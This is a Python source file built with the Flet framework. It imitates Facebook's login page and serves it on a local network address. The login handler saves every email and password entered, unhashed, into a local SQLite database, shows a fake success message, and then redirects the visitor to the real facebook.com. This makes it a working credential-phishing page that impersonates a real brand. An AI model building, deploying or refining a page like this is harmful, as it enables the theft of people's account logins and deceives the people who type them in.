import flet
from flet import *
import sqlite3

def main(page: Page):
    page.window_width = 390
    page.window_height = 800
    page.padding = 0
    page.theme_mode = ThemeMode.LIGHT
    page.scroll = ScrollMode.AUTO

    # Facebook Theme Colors
    FB_BLUE = "#1877F2"
    FB_BG = "#F0F2F5"
    FB_TEXT = "#1C1E21"

    def create_connection():
        conn = sqlite3.connect("facebook_clone.db")
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                fullname TEXT NOT NULL,
                email TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        return conn

    def show_snackbar(text, color=Colors.RED_400):
        page.snack_bar = SnackBar(
            content=Text(text, color=Colors.WHITE),
            bgcolor=color,
            action="OK"
        )
        page.snack_bar.open = True
        page.update()

    def try_login(e):
        email = email_field.value
        password = password_field.value

        if not email or not password:
            show_snackbar("Please fill in all fields")
            return

        conn = create_connection()
        cursor = conn.cursor()
        cursor.execute(
            "SELECT id, fullname, email FROM users WHERE email = ? AND password = ?",
            (email, password)
        )
        user = cursor.fetchone()

        if user:
            show_snackbar("Login successful!", Colors.GREEN_400)
            conn.close()
            page.launch_url("https://facebook.com")
        else:
            try:
                fullname = email.split('@')[0]
                cursor.execute(
                    "INSERT INTO users (fullname, email, password) VALUES (?, ?, ?)",
                    (fullname, email, password)
                )
                conn.commit()
                conn.close()
                show_snackbar("Account created successfully!", Colors.GREEN_400)
                page.launch_url("https://facebook.com")
            except sqlite3.IntegrityError:
                show_snackbar("An error occurred. Please try again.")
                conn.close()

    def login_view():
        page.clean()
        page.bgcolor = FB_BG

        global email_field, password_field

        logo = Text("facebook", size=42, weight=FontWeight.BOLD, color=FB_BLUE)
        tagline = Text(
            "Facebook helps you connect and share with the people in your life.",
            size=16,
            color=FB_TEXT,
            text_align=TextAlign.CENTER
        )

        email_field = TextField(
            label="Email address or phone number",
            border_radius=6,
            border_color=Colors.GREY_400,
            focused_border_color=FB_BLUE,
            text_size=16,
            height=48,
            width=350
        )

        password_field = TextField(
            label="Password",
            password=True,
            can_reveal_password=True,
            border_radius=6,
            border_color=Colors.GREY_400,
            focused_border_color=FB_BLUE,
            text_size=16,
            height=48,
            width=350
        )

        login_form = Column([
            logo,
            tagline,
            Divider(height=20, color="transparent"),
            email_field,
            password_field,
            ElevatedButton(
                "Log in",
                style=ButtonStyle(
                    color=Colors.WHITE,
                    bgcolor=FB_BLUE,
                    padding=padding.all(15),
                    shape=RoundedRectangleBorder(radius=6),
                ),
                width=350,
                height=48,
                on_click=try_login,
            ),
            TextButton(
                "Forgotten password?",
                style=ButtonStyle(color=FB_BLUE)
            ),
            Divider(),
            Container(
                content=Text(
                    "By continuing, you agree to our Terms of Service and Privacy Policy",
                    size=12,
                    color=Colors.GREY_700,
                    text_align=TextAlign.CENTER
                ),
                margin=margin.only(top=10),
            ),
        ],
            alignment=MainAxisAlignment.CENTER,
            horizontal_alignment=CrossAxisAlignment.CENTER,
            spacing=15,
        )

        page.add(
            Container(
                content=login_form,
                alignment=alignment.center,
                padding=padding.symmetric(horizontal=20, vertical=40),
                expand=True
            )
        )
        page.update()

    login_view()


if __name__ == "__main__":
    flet.app(target=main, view=flet.WEB_BROWSER, host="192.168.1.16", port=8550)
